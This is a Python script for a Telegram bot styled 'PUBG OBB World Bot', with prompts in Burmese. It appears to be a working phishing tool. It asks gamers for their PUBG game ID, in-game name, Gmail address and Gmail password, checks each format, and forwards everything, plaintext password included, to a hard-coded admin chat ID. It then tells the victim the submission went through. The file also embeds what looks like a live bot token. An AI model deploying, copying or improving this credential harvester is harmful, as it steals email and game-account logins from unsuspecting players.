import telebot
from telebot import types
import re

API_TOKEN = '8865399495:AAEzgxd8DKMfx1rjhVpsTLmQWu5gZn7zekc'
ADMIN_ID = '8057907907'

bot = telebot.TeleBot(API_TOKEN)
user_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    user_data[message.chat.id] = {'step': 'game_id'}
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📋 အချက်အလက်ဖြည့်ရန် နှိပ်ပါ", callback_data='fill_form'))
    bot.send_message(message.chat.id, "✨ *PUBG OBB World Bot* ✨\n\nစတင်ရန် ခလုတ်ကိုနှိပ်ပါ:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == 'fill_form')
def fill_form_callback(call):
    bot.send_message(call.message.chat.id, "✅ ကောင်းပါပြီ။ ပထမဦးစွာ သင့်ရဲ့ Game ID (ဂဏန်း ၉ လုံး သို့မဟုတ် ၁၀ လုံး) ကို ပို့ပေးပါ:")

@bot.message_handler(func=lambda message: message.chat.id in user_data)
def handle_steps(message):
    chat_id = message.chat.id
    step = user_data[chat_id].get('step')

    # ၁။ Game ID စစ်ဆေးခြင်း
    if step == 'game_id':
        if not (message.text.isdigit() and len(message.text) in [9, 10]):
            bot.reply_to(message, "⚠️ Game ID မှားယွင်းနေသည်။ ဂဏန်း ၉ လုံး သို့မဟုတ် ၁၀ လုံးသာဖြစ်သည်။ Please Resend Info🗃️")
            return
        user_data[chat_id]['game_id'] = message.text
        user_data[chat_id]['step'] = 'game_name'
        bot.send_message(chat_id, "✅ Game ID မှန်ပါသည်။ ယခု Game Name ကို ပို့ပေးပါ:")

    # ၂။ Game Name စစ်ဆေးခြင်း
    elif step == 'game_name':
        user_data[chat_id]['game_name'] = message.text
        user_data[chat_id]['step'] = 'gmail'
        bot.send_message(chat_id, "✅ ကောင်းပါပြီ။ Gmail ကို ပို့ပေးပါ (ဥပမာ: xxx@gmail.com):")

    # ၃။ Gmail စစ်ဆေးခြင်း
    elif step == 'gmail':
        if not re.match(r"^[a-zA-Z0-9_.+-]+@gmail\.com$", message.text):
            bot.reply_to(message, "⚠️ Gmail ပုံစံမမှန်ပါ။ Please Resend Info🗃️")
            return
        user_data[chat_id]['gmail'] = message.text
        user_data[chat_id]['step'] = 'password'
        bot.send_message(chat_id, "✅ ကောင်းပါပြီ။ Password ကို ပို့ပေးပါ (English စာနှင့် ဂဏန်းသာ):")

    # ၄။ Password စစ်ဆေးခြင်း
    elif step == 'password':
        if re.search(r'[\u1000-\u109f]', message.text) or not re.match(r'^[a-zA-Z0-9@#$%^&!]+$', message.text):
            bot.reply_to(message, "⚠️ Password တွင် မြန်မာစာ မပါရပါ။ English စာနှင့် ဂဏန်းသာ သုံးပါ။ Please Resend Info🗃️")
            return
        
        final_msg = (f"📩 *PUBG OBB World - အချက်အလက်အသစ်* 📩\n\n"
                     f"Game ID: {user_data[chat_id]['game_id']}\n"
                     f"Game Name: {user_data[chat_id]['game_name']}\n"
                     f"Gmail: {user_data[chat_id]['gmail']}\n"
                     f"Password: {message.text}")
        bot.send_message(ADMIN_ID, final_msg, parse_mode="Markdown")
        bot.reply_to(message, "✅ အချက်အလက်များ အောင်မြင်စွာ ပို့ဆောင်ပြီးပါပြီ။")
        del user_data[chat_id]

print("🔥 BOT IS RUNNING SUCCESSFULLY... 🔥")
bot.infinity_polling()
